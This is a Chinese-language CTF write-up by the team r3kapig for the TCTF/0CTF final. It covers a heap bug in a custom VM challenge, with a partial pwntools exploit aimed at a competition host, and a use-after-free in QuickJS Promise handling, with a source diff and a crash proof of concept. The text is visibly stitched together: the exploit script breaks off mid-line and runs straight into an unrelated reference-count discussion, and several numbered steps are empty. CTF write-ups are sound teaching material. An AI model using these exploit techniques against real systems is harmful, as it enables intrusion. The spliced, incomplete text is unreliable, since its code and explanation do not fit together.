# TCTF/0CTF final WP by r3kapig
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
九月底和 r3kapig 的大师傅们一起打了国际比赛 TCTF/0CTF final，最终战队取得了世界排名第二，国内排名第一的好成绩，现将师傅们的 wp
整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~
简历请投战队邮箱：[PI:EMAIL](mailto:PI:EMAIL)
## PWN
###  0VM
实现了一个简单的虚拟机，只不过虚拟机的指令是做完快速傅里叶变换后的膜长拼接出来的。做逆快速傅里叶变换就能求出应有的输入。虚拟机操作的内存通过单链表方式组织，在取出之后并没有将
block 的 fd 指针位置清空，但是已经将该 block 对应 mask
置1，所以可以正常读取泄露该指针，从而计算出libc地址。同时还有逻辑问题，在向链表插入mask为0 的 block 地址时，是先将要插入的 block
地址对应的内存置空，然后再去检查该 block 对应的 mask，所以可以用该漏洞，对一个已经加入链表的 block
空间的内存进行部分写空字节。然后就是劫持链表伪造结构体，从而进行任意读写了。
    from pwn import *
    import os
    context.log_level = 'debug'
    # io = process('./0VM')
    # io = remote('121.5.102.199', 20000)
    # io = remote('192.168.163.135', 20000)
    libc = ELF('./libc-2.31.so')
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    # lg = lambda s,addr        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, '\x00'))
    uu64 = lambda data        : u64(data.ljust(8, '\x00'))
    text ='''heapinfo
    '''
    def wrap(op, parm1, parm2, parm3):
        cmd = "./FFT "
        cmd += str(op) + " "
        cmd += str(parm1) + " "
        cmd += str(parm2) + " "
        for x in p64(parm3):
            cmd += str(ord(x)) + " "
        f = os.popen(cmd)
        res = f.readlines()
        final = "".join(res)
        # print final.encode('hex')
        sn(final)
    def vm1_copy_data(idx1, idx2):
        wrap(1, idx1, idx2, 0)
    def vm2_assi_data(idx, val):
        wrap(2, idx, 0, val)
    def vm3_read_from_data(idx, val):
        wrap(3, idx, 0, val)
    def vm4_write_to_data(idx, val):
        wrap(4, idx, 0, val)
    def vm5_add_data(idx1, idx2):
        wrap(5, idx1, idx2, 0)
    def vmf1_show_map(val):
        wrap(0xf, 1, 0, val)
    def vmf2_alloc_map(val):
        wrap(0xf, 2, 0, val)
    def vmf3_edit_map(val):
        wrap(0xf, 3, 0, val)
    # io = process('./0VM')
    io = remote('121.5.102.199', 20000)
    # io = remote('192.168.163.135', 20000)
    ru("  #\n\n")
    for x in xrange(0x40):
        vmf2_alloc_map(0x82*0x10) 
    vmf3_edit_map(0x82u.ptr 可以看到 ref_count == 2
    Math.min(o); // ref_count == 2 --> 1
    let v = o; // ref_count == 2
    Math.min(o); // ref_count == 3 --> 2
    o = 1; // ref_count == 1
    Math.min(v); // ref_count == 2 --> 1
    v = 1; // ref_count == 0
这里看似简单，但是我也调试了挺久，才渐渐明白：
  1. 全局变量的赋值通过 JS_SetGlobalVar 来进行。如果修改变量使得其不再指向原来的对象，会调用 JS_FreeValue 将原来的对象引用值减 1：
  2.   3. JavaScript 函数的调用，通过 JS_CallInternel 实现。在调用函数之前，会首先根据参数类型进行特殊处理。如果，我们传入的是一个 Object，那么会添加一个新的引用：
  4.   5. 然后，在这里进行调用相应的 handler 处理 JavaScript 函数：
  6.   7. 调用完成后，将原来复制的变量进行清除。这里可能会有个疑惑的地方，为什么调用到我们自定义函数时，好像 ref_count 多了 1 次，我们查看函数调用栈就知道了：
  8.   9. 可以看到，QuickJS 执行自定义函数会调用一次 JS_CallInternal，然后调用 Math.min 又会调用一次 JS_CallInternal，那么就会调用两次 JS_NewObject，因此 ref_count 的次数就会多一次。
**二、漏洞分析**
题目名称直接叫 Promise，说明漏洞利用点可能和 Promise 有关。Promise 是 JavaScript
中的一种异步机制，它会在主线程执行完毕之后再开始执行，但是 Promise 可以使用和修改全局变量。
我们查看 diff 文件
    diff --git a/deps/quickjs/src/quickjs.c b/deps/quickjs/src/quickjs.c
    index a39ff8f..4af672c 100644
    --- a/deps/quickjs/src/quickjs.c
    +++ b/deps/quickjs/src/quickjs.c
    @@ -46175,7 +46175,8 @@ static void fulfill_or_reject_promise(JSContext *ctx, JSValueConst promise,
    ​
         if (!s || s->promise_state != JS_PROMISE_PENDING)
             return; /* should never happen */
    -    set_value(ctx, &s->promise_result, JS_DupValue(ctx, value));
    +    set_value(ctx, &s->promise_result, value);
         s->promise_state = JS_PROMISE_FULFILLED + is_reject;
     #ifdef DUMP_PROMISE
         printf("fulfill_or_reject_promise: is_reject=%d\n", is_reject);
可以看到，新版本 set_value 前对 value 进行了处理，添加了一个 JS_DupValue 操作，我们看一下 JS_DupValue：
JS_DupValue 的作用其实就是增加了 value 的引用次数。从这里，我们推测：Promise 在进行参数复制的时候，没有增加对象的
ref_count 从而导致了 UAF 的产生。
**三、漏洞利用**
**1、POC 触发 crash**
为了验证我们的想法，我们尝试以下代码：
    let f = (v) => {
        Math.min(v);
        console.log('Math.min!');
    }
    ​
    let arr = new ArrayBuffer(0xa00);
    let main = () => {
        let p = new Promise((resolve, reject) => {
            console.log('Promise Init!');
            resolve(arr);
        });
        p.then(f);
    }
    ​
    main();
    console.log('Main Finished!');
    /*
    Result:
    Promise Init!
    Main Finished!
    Math.min!
    tjs:/home/callmecro/Desktop/TCTF2021/promise_123c8c0b9a9154a60cfeb4e18a392641/release/txiki.js/deps/quickjs/src/quickjs.c:5658: gc_decref_child: Assertion `p->ref_count > 0' failed.
    Aborted (core dumped)
    */
我们可以下断点看看：
这里便是我们 resolve(arr) 代码的地方，我们执行 set_value 看看：
可以看到，函数将我们的 arr 传入给 &promise->result，但是并没有 ref_count++，从而 gc 在进行回收处理的时候，触发
assert：
    static void gc_decref_child(JSRuntime *rt, JSGCObjectHeader *p)
    {
        assert(p->ref_count > 0);